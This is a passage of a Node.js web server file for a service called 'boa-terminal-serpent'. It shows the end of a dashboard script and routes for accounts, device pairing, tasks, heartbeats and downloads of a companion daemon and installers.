async function addTask(){ show(await api('/api/workspace/task', { sessionToken, title: val('task-title') })); }
async function refresh(){ const res = await fetch('/api/dashboard?session=' + encodeURIComponent(sessionToken)); show(await res.json()); }
async function runSandbox(){ show(await api('/api/sandbox', { input: val('sandbox-input'), target: val('sandbox-target') })); }
async function probeDaemon(){ try{ const res = await fetch('http://127.0.0.1:47874/status', { mode:'cors' }); show({daemonDetected:true, status: await res.json()}); } catch(error) { show({daemonDetected:false, nextStep:'Create/login, download the daemon, then run node boa-daemon.js install && node boa-daemon.js daemon.', detail:error.message}); } }
function downloadDaemon(){ if(!sessionToken) return show({error:'Login or create an account first.'}); location.href='/download/boa-daemon.js?session=' + encodeURIComponent(sessionToken); }
function val(id){ return document.getElementById(id).value; }
if(sessionToken) refresh().catch((error)=>show({error:error.message})); else probeDaemon();
</script>
</body>
</html>`;
  }

  async route(request, response) {
    try {
      const url = new URL(request.url, this.baseUrl);
      if (request.method === 'GET' && (url.pathname === '/' || url.pathname === '/dashboard')) {
        sendText(response, 200, this.dashboardHtml(), 'text/html; charset=utf-8');
        return;
      }
      if (request.method === 'GET' && url.pathname === '/health') {
        sendJson(response, 200, {
          status: 'ok',
          service: 'boa-terminal-serpent',
          timestamp: new Date().toISOString(),
        });
        return;
      }
      if (request.method === 'GET' && url.pathname === '/api/dashboard') {
        sendJson(response, 200, this.dashboardData(url.searchParams.get('session')));
        return;
      }
      if (request.method === 'GET' && url.pathname === '/download/boa-daemon.js') {
        const source = this.downloadDaemon(url.searchParams.get('session'));
        sendText(response, 200, source, 'application/javascript; charset=utf-8', {
          'content-disposition': 'attachment; filename="boa-daemon.js"',
        });
        return;
      }
      if (request.method === 'GET' && url.pathname === '/download/installer') {
        const installer = this.installerScript(url.searchParams.get('session'), url.searchParams.get('platform'));
        sendText(response, 200, installer.body, installer.contentType, {
          'content-disposition': `attachment; filename="${installer.filename}"`,
        });
        return;
      }
      if (request.method === 'GET' && url.pathname === '/download/daemon') {
        const installer = this.installerScript(url.searchParams.get('session'), url.searchParams.get('platform'));
        sendText(response, 200, installer.body, installer.contentType, {
          'content-disposition': `attachment; filename="${installer.filename}"`,
        });
        return;
      }
      if (request.method === 'GET' && url.pathname.startsWith('/download/static/')) {
        const filename = path.basename(url.pathname);
        const daemonPath = path.join(process.cwd(), 'dist', filename);
        if (!/^boa-daemon-(linux|windows|macos)\.js$/.test(filename) || !fs.existsSync(daemonPath)) {
          sendJson(response, 404, { error: 'Daemon build not found.' });
          return;
        }
        sendText(response, 200, fs.readFileSync(daemonPath, 'utf8'), 'application/javascript; charset=utf-8', {
          'content-disposition': `attachment; filename="${filename}"`,
        });
        return;
      }
      if (request.method !== 'POST') {
        sendJson(response, 404, { error: 'Route not found.' });
        return;
      }
      const body = await readJsonBody(request);
      if (url.pathname === '/api/signup') sendJson(response, 201, this.createAccount(body));
      else if (url.pathname === '/api/login') sendJson(response, 200, this.login(body));
      else if (url.pathname === '/api/pair/start') sendJson(response, 201, this.startPairing(body.sessionToken, body));
      else if (url.pathname === '/api/pair/complete') sendJson(response, 200, this.completePairing(body));
      else if (url.pathname === '/api/plan') sendJson(response, 200, this.purchasePlan(body.sessionToken, body.plan));
      else if (url.pathname === '/api/sandbox') sendJson(response, 200, this.sandboxDemo(body));
      else if (url.pathname === '/api/workspace/task') sendJson(response, 201, this.addTask(body.sessionToken, body.title, body.details || {}));
      else if (url.pathname === '/api/workspace/complete') sendJson(response, 200, this.completeTask(body.sessionToken, body.taskId, body.result || {}));
      else if (url.pathname === '/api/daemon/issue') sendJson(response, 201, this.issueDaemonForSession(body.sessionToken, body));
      else if (url.pathname === '/api/daemon/heartbeat') sendJson(response, 200, this.heartbeat(body));
      else if (url.pathname === '/api/cast/frame') sendJson(response, 200, this.castFrame(body));
      else sendJson(response, 404, { error: 'Route not found.' });
    } catch (error) {
      sendJson(response, 400, { error: error.message });
    }
  }

  listen(options = {}) {
    const port = Number(options.port || new URL(this.baseUrl).port || 8787);
    const host = options.host || '127.0.0.1';
    const server = http.createServer((request, response) => this.route(request, response));
    return new Promise((resolve) => {
      server.listen(port, host, () => resolve(server));
    });
  }
}

module.exports = {
  BoaSite,
  DEFAULT_STATE,
  hashPassword,
  verifyPassword,
};
